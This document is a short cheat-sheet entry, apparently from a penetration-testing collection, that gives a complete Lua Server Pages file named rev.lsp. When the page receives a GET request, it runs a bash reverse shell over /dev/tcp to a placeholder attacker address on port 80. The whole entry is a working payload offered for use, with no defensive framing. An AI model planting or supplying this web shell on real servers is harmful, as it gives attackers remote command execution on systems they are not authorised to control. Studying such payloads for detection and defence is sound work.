# Lua Server Pages (.lsp) reverse shell

rev.lsp

    <div style="margin-left: auto; margin-right: auto; width: 350px;">
    <div id="info">
    <h2>Lua Server Pages Reverse Shell</h2>
    <p>haha</p>
    </div>
    <?lsp if request:method() == "GET" then ?>
    <?lsp os.execute("bash -c 'bash -i >& /dev/tcp/ATTACK_IP/80 0>&1'") ?>
    <?lsp else ?>
    You sent a <?lsp=request:method() ?> request
    <?lsp end ?>
    </div>
